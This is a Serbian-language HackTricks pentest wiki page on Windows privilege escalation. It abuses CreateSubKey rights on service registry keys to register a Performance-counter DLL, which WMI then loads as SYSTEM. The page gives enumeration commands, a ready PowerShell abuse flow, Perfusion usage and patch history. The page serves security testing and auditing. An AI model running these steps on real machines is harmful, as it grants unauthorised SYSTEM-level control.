# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Originalni post je** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Sažetak

Ako imate samo **`Create Subkey`** / **`AppendData/AddSubdirectory`** nad registry ključem servisa, to je i dalje dobar trag za privesc. Obično **ne možete** direktno da prepišete `ImagePath`, `ServiceDll` ili druge postojeće vrednosti, ali i dalje možda možete da napravite podključ **`Performance`** ispod:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Bilo kog drugog **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** ključa gde vaš token ima **`KEY_CREATE_SUB_KEY`**

Trik je u tome što Windows i dalje podržava legacy model registracije **PerfLib V1**. Ako servis ima podključ **`Performance`**, Windows može da učita DLL odatle kada potrošač performance counter-a zatraži podatke.

Prema Microsoft dokumentaciji, minimalna registracija je:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Dakle, ključna poenta za ofanzivu je: **nemoj odbaciti nalaz u service registry samo zato što si dobio `CreateSubKey` umesto `SetValue`**.

## Zašto je ovo dovoljno za code execution

`Performance` podključ obično **ne postoji** podrazumevano na ovim servisima, pa ti je potreban baš **`KEY_CREATE_SUB_KEY`** kao primitiv. Kada ključ postoji i sadrži `Library`/`Open`/`Collect`/`Close`, svaki **performance counter consumer** može da okine učitavanje DLL-a.

Nekoliko važnih detalja:

- Vrednost **`Library`** može da pokazuje na **punu putanju do DLL-a**.
- DLL mora da eksportuje **`OpenPerfData`**, **`CollectPerfData`** i **`ClosePerfData`** i da vraća `ERROR_SUCCESS`.
- Kod se izvršava u **kontekstu consumer-a**, **ne nužno u samom ranjivom service procesu**.
- U klasičnom slučaju `RpcEptMapper` / `Dnscache`, **WMI performance query** može da natera **`wmiprvse.exe`** da učita DLL kao **`NT AUTHORITY\SYSTEM`**.

Zato je ovaj primitiv lako prevideti tokom triage-a: parent service key nije "potpuno writable", ali se i dalje može iskoristiti za napad.

## Brza enumeracija

Ručno proveravanje sa **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Primer PowerShell za traženje principal-a sa niskim privilegijama sa **`CreateSubKey`** na service key-jevima:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Korisni alati:

- **PrivescCheck**: `Get-ModifiableRegistryPath` je napravljen posebno da otkrije ovu klasu problema.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatizuje DLL drop, `Performance` registraciju, WMI trigger, token duplication i cleanup na legacy ranjivim metama (na primer: `Perfusion.exe -c cmd -i -k Dnscache`).

## Abuse flow

Kreiraj `Performance` subkey i popuni potrebne vrednosti:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Zatim pokrenite **privileged** performance consumer. Klasičan primer je WMI upit preko `Win32_Perf*` klasa:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Operativne napomene:

- Pokretanje **`perfmon.exe`** je korisno za proveru da li je registracija brojača ispravna, ali to obično učitava DLL samo u **tvom sopstvenom user context**.
- Za stvarni LPE, okini **privilegovani** consumer kao što je **WMI**.
- Ako pišeš svoj exploit, direktno pokretanje `cmd.exe` iznutra DLL-a obično ostavlja shell u **session 0**. `Perfusion` to rešava dupliranjem privilegovanog tokena u proces koji je pokrenut suspended u napadačevoj sesiji.
- Uskladi arhitekturu DLL-a sa ciljnim consumer-om (**x64 na x64 sistemima**).

## Napomene o verzijama / skorašnji razvoj

Istorijski, ugrađeni slabi ključevi su bili:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` i `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` napominje da su **April 2021** update-i uklonili lak put eksploatacije na ažuriranom **Windows 8 / Windows Server 2012**, dok je **Windows 7 / Windows Server 2008 R2** ostao eksploatabilan preko **`Dnscache`**.

Ovaj primitive nije **samo istorijski**. U **January 2025**, Microsoft je zakrpio srodni AD DS problem gde su članovi **`Network Configuration Operators`** mogli da kreiraju subključeve ispod **`Dnscache`** i **`NetBT`**, a ista ideja **Performance-counter DLL registration** mogla je da se ponovo iskoristi za dosezanje **SYSTEM** na podržanim sistemima.

Dakle, moderna pouka je generička: kad god low-privileged principal ima **`CreateSubKey`** nad **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, proveri da li je dovoljan **`Performance`** child key pre nego što odbaciš finding.

## Reference

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
